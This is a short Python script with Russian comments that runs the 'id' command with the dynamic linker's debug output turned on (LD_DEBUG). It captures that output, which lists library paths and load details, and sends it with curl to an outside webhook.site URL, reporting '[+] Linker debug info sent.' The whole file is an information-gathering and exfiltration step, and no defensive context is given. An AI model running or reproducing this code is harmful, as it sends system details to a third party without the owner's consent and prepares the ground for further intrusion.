import os
import subprocess

def debug_linker():
    # LD_DEBUG=all заставляет линковщик выводить КАЖДЫЙ шаг загрузки любого процесса
    # Это выдаст гигантское количество инфы о путях, библиотеках и адресах.
    os.environ["LD_DEBUG"] = "files" 
    
    try:
        # Запускаем что угодно, например 'id'
        result = subprocess.run(["id"], capture_output=True, text=True)
        
        # Весь отладочный вывод пойдет в stderr
        debug_output = result.stderr
        
        # Отправляем на хук
        subprocess.run(['curl', '-s', '-X', 'POST', '-d', debug_output, 
                        'https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2'])
        print("[+] Linker debug info sent.")
    except Exception as e:
        print(f"[-] Debug failed: {e}")

if __name__ == "__main__":
    debug_linker()
